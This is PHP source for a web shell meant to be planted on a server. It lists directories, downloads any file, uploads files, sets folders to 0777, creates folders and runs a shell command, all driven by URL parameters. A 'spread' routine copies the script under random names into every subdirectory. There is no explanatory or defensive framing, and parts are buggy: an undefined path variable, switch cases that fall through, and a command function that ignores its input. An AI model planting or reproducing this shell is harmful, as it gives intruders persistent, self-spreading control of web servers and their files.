<?php
function spread()
{
    $destination = $_GET['destination'];
    $directories = glob($somePath . "$destination/*" , GLOB_ONLYDIR);
    foreach($directories as $folder)
    {
        if(chmod($folder, 0777) )
        {
            $file_name = rand(10000,1000000).".php";
            $me_path = getcwd();
            $me = basename(__FILE__, '.php'); 
            $me_full = $me_path.'/'.$me.".php";
            $target = $folder.'/'.$file_name;
            copy($me_full,$target);
            echo "[+] $target";
            echo "<br>";
        }
    }
    
}
function cmd()
{
    $command=$_GET['command'];
    $output = shell_exec('ls -lart');
    echo "<pre>$output</pre>";
}
function change_permission()
{
    $target_dir = $_REQUEST['destination'];
    if( chmod($target_dir, 0777) )
    {
        echo "[+] CHANGED TO 777";
    }
    else
    {
        echo "[-] Couldn't do it.";
    }
}
function upload_file()
{
    $target_dir = $_REQUEST['destination'];
    $target_file = $target_dir . basename($_FILES["file"]["name"]);
    if(move_uploaded_file($_FILES["file"]["tmp_name"], $target_file))
    {
        echo "[+] FILE UPLOADED";
    
    }
    else
    {
        echo "[+] UPLOAD FAILED";
    }
}
function make_folder()
{
    $destination = $_GET['destination'];
    $folder_name = $_GET['folder_name'];
    $dir_path = $destination."/".$folder_name;
    if (!file_exists($dir_path)) 
    {
        mkdir($dir_path, 0777, true);
        echo "FOLDER CREATED";
    }
    else
    {
        echo "FOLDER ALREADY EXIST";
    }
}
function download()
{
   $file = $_GET['download'];
   header("Content-Description: File Transfer"); 
   header("Content-Type: application/octet-stream"); 
   header("Content-Disposition: attachment; filename=\"". basename($file) ."\""); 
   readfile ($file);
   exit();  
}
function list_dir()
{
   $dir_path = $_GET['destination'];
   $myfiles = scandir($dir_path);
   ?>
   <table border='1'>
       <tr>
           <th>
               TYPE
           </th>
            <th>
               NAME
           </th>
           <th>
               FULL PATH
           </th>
           <th>
               PERMISSION
           </th>
       </tr>
   <?php
   foreach($myfiles as $list)
   {
       $full_path = $dir_path."/".$list;
       ?>
       <tr>
       <?php
       if(is_dir($full_path))
       {
       ?>
            <td>DIRECTORY</td>
            <td><?php echo $list; ?></td>
            <td><?php echo $full_path; ?></td>
            <td><?php echo substr(sprintf("%o", fileperms("$full_path")),-4); ?></td>
       <?php
       }
       else
       {
       ?>
            <td>FILE</td>
            <td><?php echo $full_path; ?></td>
            <td>
            <?php echo $full_path; ?>
            </td>
            <td><?php echo substr(sprintf("%o", fileperms("$full_path")),-4); ?></td>
       <?php
       }
       ?>
       </tr>
       <?php
   }
   ?>
   </table>
   <?php
}
function main()
{
   $action = $_GET['action'];
   switch ($action)
   {
      case "scan_dir": 
          list_dir();
      case "download":
          download();
      case "make_folder":
          make_folder();
      case "upload":
          upload_file();
      case "chmod":
          change_permission();
      case "cmd":
          cmd();
      case "spread":
          spread();
   }
}
main();
?>
